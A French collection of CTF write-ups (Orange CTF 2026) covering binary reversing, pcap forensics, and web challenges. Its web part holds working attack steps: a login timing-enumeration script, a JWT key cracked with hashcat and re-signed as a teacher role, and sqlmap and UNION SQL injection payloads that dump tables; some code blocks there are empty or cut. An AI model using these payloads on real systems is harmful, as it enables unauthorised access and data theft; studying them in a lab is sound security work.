Introduction & bilan

L'Orange CTF 2026 proposait un panel de défis variés répartis sur plusieurs catégories : Reversing, Network / Forensics et Web / API. Ce document regroupe l'intégralité de mes write-ups, organisés par catégorie, avec pour chaque défi la démarche, les outils employés, les difficultés rencontrées et, lorsque c'est pertinent, les erreurs commises.

Je documente aussi bien les défis résolus que ceux restés ouverts. L'objectif n'est pas seulement de présenter une solution propre, mais de partager le cheminement réel, y compris les fausses pistes et les moments de doute, parce que c'est souvent là que se trouve la vraie valeur pédagogique.

Reversing · 50 pts

Reversing Easy

✅ Résolu Reversing strings

On me donne un binaire ELF 01_strings_easy, strippé. Objectif : trouver le mot de passe embarqué dans le binaire et afficher le flag.

1. Première approche : reconnaissance

Avant de désassembler quoi que ce soit, je regarde toujours ce que je manipule :

Bash
file 01_strings_easy

Résultat : un ELF 64 bits, dynamiquement lié, strippé. « Strippé » veut dire que les noms de fonctions et de symboles ont été retirés du binaire, donc pas de nom de fonction du genre check_password() qui apparaîtrait tout seul dans un désassembleur. Ça m'a mis en mode « il va falloir chercher à la main ».

2. Erreur n°1 : vouloir lancer le binaire trop vite

Réflexe classique : essayer de l'exécuter direct.

Bash
./01_strings_easy
bash: ./01_strings_easy: Permission non accordée

J'avais oublié de lui donner les droits d'exécution. Petite erreur bête mais fréquente :

Bash
chmod +x 01_strings_easy
./01_strings_easy

Ça m'a demandé un mot de passe (Enter password: ). Sauf que je ne le connaissais pas encore, donc taper n'importe quoi ne servait à rien à ce stade, il fallait d'abord aller le chercher dans le binaire.

3. La bonne méthode : chercher dans les chaînes de caractères

Pour un binaire « strings easy », la première chose à tester, c'est littéralement la commande strings :

Bash
strings -a -t x 01_strings_easy

Le -t x affiche l'offset en hexadécimal de chaque chaîne trouvée, ce qui est utile pour la retrouver ensuite dans .rodata. Dans la sortie, deux lignes sautent aux yeux :

Extrait de strings 
2020 Correct! FLAG{simple_password_crack}
2050 open_sesame_2025
Mot de passe + flag en clair dans .rodata.

Le mot de passe (open_sesame_2025) et le flag (FLAG{simple_password_crack}) étaient tous les deux stockés en clair dans la section .rodata. Pas de chiffrement, pas d'obfuscation : un strippage du binaire ne protège que les symboles, pas les chaînes littérales. C'est exactement le piège pédagogique du challenge : il suffit de lire les strings, pas besoin de reverse le code.

4. Vérification : confirmer avant de soumettre

Je n'aime pas soumettre un flag « probable » sans l'avoir vérifié. J'ai donc rejoué le mot de passe trouvé :

Bash
echo "open_sesame_2025" | ./01_strings_easy

Résultat :

Enter password: Correct! FLAG{simple_password_crack}

Le binaire confirme lui-même que c'est le bon mot de passe, et il affiche le flag. À ce stade, j'étais sûr à 100 % de la réponse.

5. Erreur n°2 : la vraie difficulté n'était pas technique

J'ai soumis FLAG{simple_password_crack} sur CTFd… et la plateforme a répondu Incorrect. C'est là que l'enquête a changé de nature : ce n'était plus un problème de reverse, mais un doute sur le format attendu par CTFd. Est-ce que le flag devait être soumis brut, avec un autre préfixe que FLAG{}, ou est-ce que le mot de passe lui-même (open_sesame_2025) était la vraie réponse attendue, indépendamment du texte affiché par le binaire ?

J'ai creusé plusieurs pistes en parallèle (regarder si d'autres défis déjà validés donnaient un indice de format, comparer les hash du fichier au cas où la plateforme servait une version différente de celle téléchargée) avant que le flag finisse par passer. Le vrai enseignement ici : dans un CTF, une fois que l'extraction technique est certaine, la variable qui reste, c'est le format exact attendu par la plateforme (majuscules, préfixe, avec ou sans accolades). Ça vaut le coup de le vérifier sur un défi déjà résolu avant de s'acharner à retester la partie technique.

Reversing & Crypto · 150 pts

Reversing & Crypto

✅ Résolu Reversing XOR

Un binaire ELF 02_xor_obfusc contient un tableau d'octets XORé par une clé d'un octet. Il faut l'extraire et le décoder pour obtenir le flag. L'indice donné par les organisateurs : « Extrais le tableau depuis .rodata, puis applique un XOR octet à octet ».

1. Reconnaissance

Bash
file 02_xor_obfusc

Un ELF 64 bits, PIE (position independent executable), dynamiquement lié, strippé. PIE veut dire que les adresses ne sont pas fixes au moment de la compilation : au chargement, le binaire est relocalisé à une adresse de base aléatoire. Ça ne change rien pour l'analyse statique (les offsets dans le fichier restent les mêmes) mais ça m'a rappelé de ne pas me fier aux adresses virtuelles affichées par un désassembleur sans vérifier qu'elles correspondent bien à des offsets fichier.

2. Repérer le tableau chiffré

Comme pour Reversing Easy, j'ai commencé par les strings, mais cette fois ça n'a rien donné de lisible, logique, puisque les données sont XORées et ne ressemblent donc à aucun texte. Il fallait aller regarder .rodata directement :

Bash
readelf -S 02_xor_obfusc | grep -A1 rodata
objdump -s -j .rodata 02_xor_obfusc

Ça m'a donné le contenu brut de la section, avec les offsets. J'ai repéré un tableau de 15-16 octets qui ne formait aucune suite de caractères imprimables, signe qu'il était bien chiffré.

3. Trouver la clé

Bash
objdump -d -M intel -j .text 02_xor_obfusc | grep -A3 -B3 xor

J'ai cherché l'instruction xor dans le désassemblage de main. Elle apparaît sous la forme xor eax, 0x5a (ou xor BYTE PTR [rax], 0x5a selon la version du binaire), la clé est en dur dans le code, en immédiat, directement visible dans l'instruction.

4. Décoder

Python
d = bytes.fromhex("...")  # le tableau extrait de .rodata
key = 0x5a
print(bytes(b ^ key for b in d))

Premier résultat obtenu : aluEn[ceelJlflb. Ce n'était clairement pas un flag, pas de FLAG{, aucune structure lisible de bout en bout. Deux hypothèses à ce stade : soit je m'étais trompé de clé ou de tableau, soit le binaire lui-même était défectueux.

5. Erreur : s'acharner sur la mauvaise piste avant de douter du fichier

J'ai passé pas mal de temps à vérifier ma propre méthode : re-brute-forcer les 256 clés possibles, tester XOR avec un index variable, ROL/ROR, addition/soustraction au lieu du XOR, inverser l'ordre des octets… Rien ne donnait de résultat plus convaincant que aluEn[ceelJlflb. J'ai fini par conclure que l'extraction était correcte et que le problème venait du binaire distribué, pas de la méthode. Soumis plusieurs fois (aluEn[ceelJlflb, puis FLAG{aluEn[ceelJlflb}) : toujours refusé.

Ce qui a confirmé le diagnostic : un autre défi (Reversing Easy) donnait lui aussi un flag vérifié mais refusé par la plateforme, alors que d'autres défis du CTF étaient déjà validés par d'autres joueurs. Ça pointait vers un problème spécifique à ce challenge plutôt qu'un souci général de la plateforme, probablement un flag mal synchronisé avec le binaire publié, une erreur fréquente côté auteurs de CTF quand un challenge est régénéré après son premier déploiement.

6. Le binaire a été remplacé par les organisateurs

Le défi est repassé de 100 à 150 points et le nombre de résolutions est passé à 39 d'un coup : signe que les organisateurs avaient corrigé le problème. Un nouveau fichier 02_xor_obfusc__1_ a été fourni, avec un hash différent du premier.

J'ai reconnu les mêmes erreurs à ne pas refaire : repartir de zéro, vérifier le hash avant de réanalyser (sha256sum), et ne pas supposer que c'était le même fichier.

Bash
objdump -d -M intel -j .text 02_xor_obfusc__1_ | grep -A3 -B3 xor
objdump -s -j .rodata 02_xor_obfusc__1_

Même clé, 0x5a, mais un tableau différent en .rodata : 1c 16 1b 1d 21 22 6a 28 05 33 29 05 3c 2f 34 27. Le XOR donne cette fois FLAG{x0r_is_fun}, un résultat parfaitement lisible, avec la structure attendue.

7. Vérification finale

Bash
./02_xor_obfusc__1_

Le binaire affiche directement Decoded: FLAG{x0r_is_fun}, confirmant le calcul.

Reversing · 10 pts

Brend new String Easy

⚠️ Statut jamais confirmé Reversing base64

Un nouveau binaire 01_strings_easy_v2 est fourni, avec comme seule description : « C'est du tout cuit ». Pas d'énoncé technique précis, juste un titre qui ressemble à une variante de Reversing Easy, et un indice implicite dans le nom (« Brend new » = « Brand new », tout nouveau).

Je précise d'entrée : je n'ai jamais eu de confirmation que la valeur proposée était la bonne. Ce write-up documente la méthode et le résultat obtenu, pas une victoire certaine.

1. Réflexe n°1 : comparer avec l'ancien binaire

Comme le nom ressemblait beaucoup à 01_strings_easy, déjà résolu, j'ai tout de suite comparé les deux fichiers plutôt que de repartir de zéro :

Bash
sha256sum 01_strings_easy 01_strings_easy_v2

Les hashes étaient différents : ce n'était donc pas une simple redistribution du même fichier, mais un binaire réellement modifié. Bon réflexe à avoir systématiquement sur un CTF : avant de recommencer toute une analyse, vérifier si le fichier a vraiment changé.

2. Repartir de la méthode qui avait marché

Comme pour l'original, la bonne approche sur un challenge « strings easy » est de commencer par chercher le texte en clair avant de désassembler quoi que ce soit :

Bash
file 01_strings_easy_v2
strings -a -t x 01_strings_easy_v2

Le binaire était de nouveau strippé, ELF 64 bits PIE. Dans la sortie de strings, les chaînes de l'ancien défi étaient toujours présentes à l'identique :

Chaînes identiques à la v1 
2004 Enter password: 
2017 Wrong
2020 Correct! FLAG{simple_password_crack}
2050 open_sesame_2025
Aucune différence visible à ce niveau.

À première vue, rien de nouveau, mêmes offsets, même contenu. J'ai vérifié en exécutant le binaire avec l'ancien mot de passe :

Bash
echo "open_sesame_2025" | ./01_strings_easy_v2
# Enter password: Correct! FLAG{simple_password_crack}

Ça fonctionnait encore, mais ce n'était clairement pas le nouveau contenu attendu pour un défi distinct à 10 points, sinon pourquoi créer un binaire différent avec le même flag ?

3. Erreur : s'arrêter trop tôt sur les sections standards

Mon premier passage avec strings n'avait listé que les sections ELF classiques (.text, .rodata, .dynsym, etc.) sans rien remarquer d'anormal. Si je m'étais arrêté là, j'aurais manqué la différence. Le bon réflexe a été de lister toutes les sections du binaire, pas seulement celles qu'on attend dans un ELF standard :

Bash
readelf -S -W 01_strings_easy_v2

Une section supplémentaire est apparue, absente de l'ancien binaire : .arch, à l'offset 0x3057. Un nom de section personnalisé comme celui-là est un signal fort, une section standard générée par le compilateur ne s'appelle jamais .arch. C'était clairement ajouté exprès par les organisateurs.

4. Extraire et décoder le contenu de .arch

Bash
strings -a -t x 01_strings_easy_v2 | grep -A1 arch

Le contenu de cette section était : RmxhZ3tBcmNoX3g4Nl82NH0=. La terminaison en = et l'alphabet utilisé (lettres, chiffres, pas de caractères spéciaux hors /+=) sont la signature typique du base64. Décodage :

Bash
echo "RmxhZ3tBcmNoX3g4Nl82NH0=" | base64 -d

Résultat : Flag{Arch_x86_64}, un nom de flag cohérent avec le nom de la section (.arch) et avec l'architecture du binaire analysé plus tôt (file avait indiqué x86-64).

5. Ce qui restait incertain

Deux points de doute, jamais tranchés faute d'énoncé précis et de confirmation de la plateforme :

  • La casse du préfixe. Le flag décodé commence par Flag{, avec un F majuscule suivi de minuscules, différent du FLAG{ tout en majuscules utilisé par les autres défis du CTF. Je l'ai gardé tel quel, en respectant exactement ce que donnait le décodage, plutôt que de le « corriger » en FLAG{Arch_x86_64} sans certitude.
  • Pas d'énoncé technique. Sans description claire du défi (juste « C'est du tout cuit »), je n'ai pas pu confirmer que la section .arch était bien le point d'entrée attendu, même si c'était la seule nouveauté détectable dans le binaire.

Network · 10 pts

SSH vs Telnet

⚠️ Non confirmé Network PCAP

Un fichier capture.pcap est fourni. Énoncé : « Retrouve le flag dans la capture et complète-le ». Deux likes, zéro dislike, signe que d'autres joueurs avaient trouvé le défi correct, donc le problème venait très probablement de ma réponse, pas du challenge lui-même.

1. Identifier le format de la capture

Bash
file capture.pcap

Un fichier pcap, mais avec un détail important : Linux cooked v2 (linktype 276), pas de l'Ethernet classique. C'est le format utilisé quand la capture a été faite sur une interface any sous Linux plutôt que sur une interface réseau physique précise. Erreur à éviter ici : parser les en-têtes comme si c'était de l'Ethernet standard, la structure de l'en-tête de couche liaison n'a pas la même taille, et confondre les deux aurait décalé toute la lecture des paquets IP.

2. Cartographier les flux

Avec un parseur Python écrit à la main (toujours faute de tshark), j'ai reconstruit les flux TCP/UDP et compté les paquets par port :

Répartition des paquets 
port 22  (SSH)     : ~1900 paquets
port 23  (Telnet)  : ~112 paquets
port 8000 (HTTP)   : ~70 paquets
Trois services distincts dans la capture.

Le nom du défi (« SSH vs Telnet ») donnait déjà la piste : le SSH est chiffré, donc illisible, et le Telnet transmet tout en clair. La bonne approche était de comparer les deux pour comprendre le message du challenge, probablement une leçon de sécurité réseau (Telnet expose tout, y compris les mots de passe), et de voir où le flag se cachait concrètement.

3. Reconstituer la session Telnet

Le protocole Telnet mélange des octets de négociation (séquences IAC, commençant par 0xFF) avec les données réellement tapées par l'utilisateur. Il a fallu filtrer ces séquences de contrôle pour ne garder que le texte utile :

Python
def strip_iac(data):
    # retire les séquences IAC (0xFF suivi de codes de négociation)
    ...

En séparant les paquets client vers serveur des paquets serveur vers client, j'ai reconstitué la session complète :

  • Login : mouna (tapé lettre par lettre, avec des délais réalistes entre chaque caractère)
  • Mot de passe demandé, saisi d'un coup en un seul paquet (donc probablement collé, pas tapé) : 891c5feef171da85aadd3fdb8130ba509b03f5ea
  • Une fois connecté : commandes ls affichant deux éléments, secret.enc et le dossier snap

4. Trouver le port HTTP et le flag « gabarit »

Le port 8000 montrait des requêtes GET /flag.txt. J'ai réassemblé la réponse complète octet par octet (en faisant bien attention à recoller les paquets dans l'ordre et à ne couper qu'au bon endroit, après le \r\n\r\n qui sépare les en-têtes HTTP du corps) :

Python
head, body = data.split(b'\r\n\r\n', 1)

Le corps exact, confirmé par le Content-Length: 80 de l'en-tête, était :

Flag gabarit distribué par le serveur 
Flag{ I_Told_You_To_Stop_Using_This_Damn_Telnet_Mai_[mot de passe du telnet ] }
Le serveur distribue littéralement un gabarit à trous.

Un flag « à trous » : le serveur distribuait littéralement un gabarit, avec un espace réservé entre crochets, au lieu du flag final. Il fallait le compléter avec le mot de passe Telnet trouvé à l'étape précédente.

5. Construire le flag final, et le point resté incertain

J'ai remplacé [mot de passe du telnet ] par 891c5feef171da85aadd3fdb8130ba509b03f5ea, en proposant deux variantes sur la gestion des espaces :

Deux variantes testées
Flag{I_Told_You_To_Stop_Using_This_Damn_Telnet_Mai_891c5feef171da85aadd3fdb8130ba509b03f5ea}
Flag{ I_Told_You_To_Stop_Using_This_Damn_Telnet_Mai_891c5feef171da85aadd3fdb8130ba509b03f5ea }

La première a été soumise et marquée incorrecte. Le CTF s'est terminé avant d'avoir pu confirmer la seconde ou explorer d'autres pistes.

6. Ce qui n'a pas été vérifié

Avec le recul, plusieurs pistes n'ont pas été creusées avant la fin du temps imparti :

  • secret.enc, vu dans le ls pendant la session Telnet, n'a jamais été récupéré ni analysé. Avec deux likes sur ce défi et aucune résolution confirmée de mon côté, il est possible que le vrai chemin passait par le déchiffrement de ce fichier avec le mot de passe Telnet comme clé, plutôt que par une simple substitution de texte dans le gabarit HTTP.
  • Je n'ai pas vérifié si secret.enc circulait quelque part dans la capture (transfert SCP sur le port 22, par exemple), le trafic SSH restant chiffré et illisible avec les outils utilisés.
  • La casse ou le format exact du flag (avec/sans espaces dans les accolades) n'a été testé qu'à moitié.

Forensics · 100 pts

C2 Server

✅ Résolu Forensics tshark

Catégorie : Forensics / Réseau · Fichier fourni : simulated_pcap.pcap · Question : Quelle est l'adresse IP du serveur C2 ?

Démarche

Première étape classique en analyse forensique réseau : avoir une vue d'ensemble des échanges présents dans la capture avant de creuser dans le détail. tshark propose une statistique de conversations IP qui résume tout le trafic par paire d'hôtes :

Bash
tshark -r simulated_pcap.pcap -q -z conv,ip

Résultat :

Conversations IPv4 
IPv4 Conversations
Filter:<No Filter>
10.0.0.5  <-> 198.51.100.45     53 paquets   4 987 bytes   durée 300.0372 s
10.0.0.5  <-> 8.8.8.8           1 paquet     78 bytes      durée 0.0000 s
Deux conversations seulement.

Analyse

Deux conversations seulement apparaissent dans la capture :

  • 10.0.0.5 ↔ 8.8.8.8 : un seul paquet de 78 octets, typiquement une requête DNS isolée vers un résolveur public (Google DNS). Rien d'anormal, trafic légitime.
  • 10.0.0.5 ↔ 198.51.100.45 : 53 paquets envoyés en continu sur toute la durée de la capture (300 secondes), avec une régularité marquée (Duration: 300.0372), ce qui est la signature classique d'un beaconing : une machine compromise qui « check in » périodiquement auprès d'un serveur de commande et contrôle (C2) pour recevoir des instructions.

Le volume constant de petits paquets, la durée couvrant l'intégralité de la capture, et l'absence de toute autre activité réseau notable sur cette IP désignent clairement 198.51.100.45 comme le serveur C2, à l'inverse du DNS qui n'est qu'une requête ponctuelle et légitime.

IP du serveur C2
198.51.100.45
Forensics · 150 pts

Beacon

⚠️ Non confirmé Forensics PCAP

Un fichier simulated_pcap.pcap est fourni. Question : « Quelle est la période moyenne du beacon (en secondes) ? ». L'indice donnait la commande de départ :

Bash
tshark -r simulated_pcap.pcap -Y "udp && ip.src==10.0.0.5 && data contains \"BEACON\"" -T ...

et précisait que la réponse devait être un décimal à 6 chiffres après la virgule (x.xxxxxx).

Ce write-up est honnête sur le résultat : je n'ai jamais réussi à faire valider ce défi, malgré plusieurs analyses indépendantes qui donnaient systématiquement la même réponse. Je le documente quand même, parce que la méthode reste correcte et utile, et parce que le vrai intérêt pédagogique ici est de montrer où ça a coincé.

1. Identifier le fichier

Bash
file simulated_pcap.pcap

Un fichier pcap classique (format libpcap, timestamps en microsecondes). Je n'avais pas tshark installé dans mon environnement, donc plutôt que de m'en passer, j'ai écrit un petit parseur Python du format pcap brut, header global de 24 octets, puis pour chaque paquet un header de 16 octets (timestamp seconde, timestamp microseconde, longueur capturée, longueur originale) suivi des données.

2. Filtrer les bons paquets

L'indice donnait le filtre exact à reproduire : paquets UDP, source 10.0.0.5, dont le contenu contient la chaîne BEACON. En reconstruisant les en-têtes Ethernet/IP/UDP à la main, j'ai extrait tous les paquets correspondants.

Résultat : 40 paquets, tous envoyés vers 198.51.100.45:443, avec un payload du type BEACON:1:..., BEACON:2:..., etc., numérotés de 1 à 40, sans trou, et dans l'ordre chronologique. C'est un signal rassurant : la capture de paquets était cohérente et complète, rien ne manquait.

3. Calculer la période moyenne

Avec 40 paquets, on a 39 intervalles de temps entre deux beacons consécutifs. J'ai calculé les timestamps en arithmétique exacte (avec Fraction, pas en flottant) pour éviter toute erreur d'arrondi qui aurait pu décaler le 6e chiffre après la virgule, ce qui compte beaucoup vu le format de réponse demandé.

Python
ts = [paquet.timestamp_exact for paquet in beacons]
intervalles = [ts[i+1] - ts[i] for i in range(len(ts)-1)]
moyenne = sum(intervalles) / len(intervalles)

Résultat : 5.000365 secondes, avec une durée totale de capture de 195.014252 s sur 39 intervalles. Les intervalles individuels allaient de 4.914 s à 5.073 s, un jitter cohérent avec un beacon censé battre toutes les 5 secondes avec un peu de bruit réseau.

4. Vérifier qu'il n'y avait pas d'erreur de ma part

Avant de conclure que le problème venait du challenge, j'ai testé systématiquement plusieurs variantes de calcul pour voir si l'une d'elles collait mieux avec ce que CTFd attendait :

Cette dernière série venait d'une hypothèse précise : peut-être que l'auteur du challenge avait utilisé tshark avec une colonne du type frame.time_delta_displayed, où le premier paquet filtré a un delta de zéro (puisqu'il n'y a pas de paquet précédent dans l'affichage filtré). Si on moyenne sur 40 valeurs au lieu de 39 intervalles réels, en comptant ce zéro, on obtient 4.875356, c'est une erreur classique quand on calcule des statistiques avec tshark -T fields -e frame.time_delta_displayed sans retirer la première ligne.

5. Vérifier que le fichier n'avait pas changé

À chaque nouvelle tentative, j'ai recalculé le hash du fichier avant de refaire quoi que ce soit :

Bash
sha256sum simulated_pcap.pcap

Le hash (8e60657155b34e1d...) est resté identique sur 6 téléchargements successifs. Contrairement à Reversing & Crypto, où les organisateurs avaient fini par publier un nouveau binaire corrigé, le fichier de Beacon n'a jamais changé. Ça m'a confirmé que retélécharger n'allait rien apporter de nouveau, toutes les analyses suivantes sur le même fichier donnaient forcément le même résultat.

6. Ce qui n'a pas été résolu

Aucune des valeurs testées (5.000365, 4.875356, 7.143743) n'a été acceptée par la plateforme. Le CTF s'est terminé sans que ce défi soit validé.

1. Découverte de la surface d'attaque

On commence par examiner le serveur et ses en-têtes :

Bash

La réponse révèle un serveur Gunicorn (typique Django). En explorant les chemins classiques :

Bash

# → Redirection vers /admin/login/

On découvre une interface Django Admin. La page de login est accessible : https://orangectf2026-miwa.chals.io/admin/login/?next=/admin/

2. Test des méthodes HTTP

Bash

3. Énumération par timing sur le login

On teste plusieurs noms d'utilisateur pour mesurer le temps de réponse (Django effectue un hash de mot de passe plus long si l'user existe) :

    r = s.get(url)
    csrf = s.cookies.get("csrftoken")
    data = {"username": user, "password": "wrongpassword",
            "csrfmiddlewaretoken": csrf, "next": "/admin/"}
    start = time.time()
    s.post(url, data=data, headers={"Referer": url}, cookies={"csrftoken": csrf})

Commande finale

Analyse de la vulnérabilité : Broken Access Control (IDOR)

L'endpoint /api/profile/<id>/ ne vérifie pas que l'utilisateur authentifié a le droit de lire le profil demandé. N'importe quel utilisateur connecté peut lire n'importe quel profil en changeant l'<id> dans l'URL.

Pourquoi ce challenge illustre « ne jamais faire confiance aux clients » :

  1. L'auth est confiée à un header (Authorization: Token) que le client envoie ; si le serveur ne valide pas le contrôle d'accès, le token devient un simple laissez-passer universel.
  2. L'ID est fourni par le client dans l'URL (/api/profile/1/), sans vérification côté serveur que l'utilisateur a le droit de voir ce profil.
  3. Le token est déterministe (SHA-1), donc rejouable et potentiellement forgeable si on trouve la formule.

Impact réel

  • Fuite de données : lecture de tous les profils utilisateurs (PII, secrets).
  • Escalade de privilèges : un utilisateur normal peut accéder aux données d'un admin.
  • Dans un cas réel : ce type de faille a causé d'énormes fuites (ex : Facebook, First American Financial).

Recommandations de correction

01 · Contrôle d'accès côté serveur
Vérifier systématiquement que l'utilisateur authentifié a le droit de lire la ressource demandée.
02 · UUIDs au lieu d'IDs séquentiels
Remplacer /api/profile/1/ par /api/profile/a3f5-.../ pour empêcher l'énumération.
03 · Forcer le contexte utilisateur
Le serveur doit imposer son propre ID (request.user.id) au lieu d'accepter un ID arbitraire.
04 · Ne pas exposer de champs sensibles
Les serializers ne doivent pas inclure secret_flag, is_admin, etc.
05 · Rate limiting
Empêcher l'énumération massive des IDs par utilisateur authentifié.

Challenge : Récupérer le mot de passe via SQL injection · Cible : https://orangectf2026-kusakabe.chals.io

Reconnaissance

Un ffuf sur le domaine révèle une seule route exposée : /api.

Bash
ffuf -u https://orangectf2026-kusakabe.chals.io/FUZZ -w raft-small-directories.txt
api    [Status: 301]

Une requête sur /api/ liste les endpoints disponibles :

Documentation exposée sur /api/ 
{
  "challenge": "Prof Imposteur",
  "endpoints": {
    "POST /api/register": "{username, password} -> crée un compte étudiant + JWT",
    "POST /api/login": "{username, password} -> JWT",
    "GET  /api/me": "infos du jeton courant (Bearer)",
    "GET  /api/teacher/students?search=": "détails des élèves (PROFESSEUR uniquement)"
  },
  "hint": "Le jeton est signé HS256. La clé est... faible."
}
Deux cibles : JWT + endpoint search réservé aux profs.

Deux cibles apparaissent clairement : un contrôle d'accès basé sur un rôle encodé dans un JWT, et un endpoint search réservé aux profs, candidat naturel pour une injection SQL.

Étape 1 : Élévation de privilège via JWT forgé

Création d'un compte étudiant classique :

Bash
curl -X POST .../api/register -d '{"username":"test123","password":"test123"}'
curl -X POST .../api/login    -d '{"username":"test123","password":"test123"}'

Le JWT obtenu, décodé (base64, sans vérification) :

JSON
{"user_id":4,"username":"test123","role":"student","teacher_id":null,"iat":...,"exp":...}

Le contrôle d'accès repose entièrement sur le champ role du payload, validé uniquement par la signature HS256. L'indice annonçait une clé faible : bruteforce avec hashcat (mode 16500) sur rockyou.txt :

Bash
hashcat -a 0 -m 16500 "<JWT>" rockyou.txt --show

→ clé trouvée : secret.

Avec la clé en main, re-signature d'un token avec role: "teacher" (PyJWT) :

Python
import jwt, time
now = int(time.time())
payload = {"user_id":4,"username":"test123","role":"teacher","teacher_id":None,"iat":now,"exp":now+3600}
print(jwt.encode(payload, "secret", algorithm="HS256"))

Ce token forgé est accepté par GET /api/teacher/students, accès prof obtenu sans jamais avoir le vrai mot de passe d'un prof.

Étape 2 : Injection SQL sur le paramètre search

teacher_id étant null dans le token forgé, la requête backend ne renvoie aucun élève (WHERE teacher_id = NULL ne matche rien en SQL). Mais le paramètre search reste exploitable indépendamment.

Confirmation avec sqlmap :

Bash
sqlmap -u ".../api/teacher/students?search=test" --headers="Authorization: Bearer <JWT>" --dbs
Sortie sqlmap 
Parameter: search (GET)
Type: UNION query
Title: Generic UNION query (NULL) - 6 columns
Payload: search=test' UNION ALL SELECT ... --
back-end DBMS: SQLite
Injection UNION based confirmée, backend SQLite.

Une erreur SQL provoquée volontairement a révélé la requête exacte côté serveur :

SQL
SELECT id, name, email, teacher_id, grade, secret_note
FROM api_student
WHERE teacher_id = 'None' AND name LIKE '%<search>%'

→ injection UNION based classique à 6 colonnes, backend SQLite.

Étape 3 : Énumération du schéma

SQLite stocke le DDL de chaque table dans sqlite_master, exploitable directement via l'injection :

Bash
curl -G .../api/teacher/students \
  --data-urlencode "search=test' UNION SELECT name,NULL,NULL,NULL,NULL,NULL FROM sqlite_master WHERE type='table'-- -" \
  -H "Authorization: Bearer <JWT_teacher>"

→ 11 tables, dont api_account (comptes applicatifs) et api_student (fiches élèves, avec une colonne secret_note repérée via l'erreur SQL précédente).

Dump de api_account (colonnes username, password, role, teacher_id, display_name) : les comptes profs (prof.gojo, prof.yaga) ont un mot de passe factice (x-non-utilise), fausse piste, leur authentification réelle ne passe pas par cette table. auth_user (table Django standard) s'est avérée vide.

Étape 4 : Extraction du flag

Pivot vers api_student, en ciblant directement le champ secret_note révélé par l'erreur SQL de l'étape précédente :

Bash
curl -G .../api/teacher/students \
  --data-urlencode "search=test' UNION SELECT name,secret_note,NULL,NULL,NULL,NULL FROM api_student-- -" \
  -H "Authorization: Bearer <JWT_teacher>"

Résultat :

Flag extrait 
{"id": "Gojo Satoru", "name": "CTF{Im_Stronger_Than_Your_Password}", ...}
Le flag était caché dans la colonne secret_note.
Flag final
CTF{Im_Stronger_Than_Your_Password}

Chaîne d'attaque 1. Compte étudiant → JWT légitime → 2. Bruteforce HS256 (secret) → 3. Forge JWT role:teacher → 4. SQLi UNION sur search → 5. Énumération sqlite_master → 6. Flag dans api_student.secret_note
